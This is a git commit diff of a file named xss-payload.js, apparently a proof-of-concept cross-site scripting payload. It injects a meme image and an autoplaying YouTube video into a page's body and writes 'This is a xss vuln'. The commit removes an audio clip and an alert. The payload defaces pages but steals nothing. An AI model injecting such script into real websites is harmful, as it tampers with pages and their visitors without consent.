8c5bb25aa9006d710102c91c77e1962cfa754503
Chaz L <chaz6cl@live.com>
2020-05-26 23:01:41 +1000

    Updated xss-payload.js

--- xss-payload.js
+++ xss-payload.js
@@ -1,7 +1,4 @@
 var body = document.getElementsByTagName('body')[0];
 body.innerHTML += '<img src="https://i.kym-cdn.com/entries/icons/mobile/000/021/807/ig9OoyenpxqdCQyABmOQBZDI0duHk2QZZmWg2Hxd4ro.jpg" />'; 
 body.innerHTML += '<iframe width="560" height="315" src="https://www.youtube.com/embed/V4MF2s6MLxY?rel=0;autoplay=1" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>';
-var audio = new Audio('audio_file.mp3');
-audio.play();
 document.write ("This is a xss vuln");
-alert ("This is a xss vuln");
